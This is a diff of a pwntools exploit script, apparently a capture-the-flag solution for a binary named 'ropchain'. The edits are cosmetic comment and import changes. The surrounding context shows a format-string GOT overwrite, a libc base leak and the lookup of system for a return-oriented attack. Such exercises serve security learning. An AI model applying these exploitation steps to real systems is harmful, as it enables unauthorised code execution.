@@ -1,8 +1,6 @@
 from pwn import *
-import warnings
-warnings.filterwarnings("ignore", module="pwnlib.elf")
 
-# Load ELF và libc
+# Load binary file và libc
 elf = ELF("./ropchain")
 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
@@ -39,7 +37,7 @@ def make_payload(addr_value, pos, leak_pos=None):
     return payload
 
 
-# Define format string
+# Define payload1
 fmt = {
     elf.got['exit']: 0x1196,
     elf.sym['a']: 0xfffff,
@@ -58,6 +56,7 @@ leak = int(p.recv(12), 16)
 p.recvuntil(b"@@")
 libc.address = leak - 243 - libc.sym['__libc_start_main']
 info(f"Libc base: 0x{libc.address:02x}")
+
 
 # Get system address
 system = libc.sym['system']
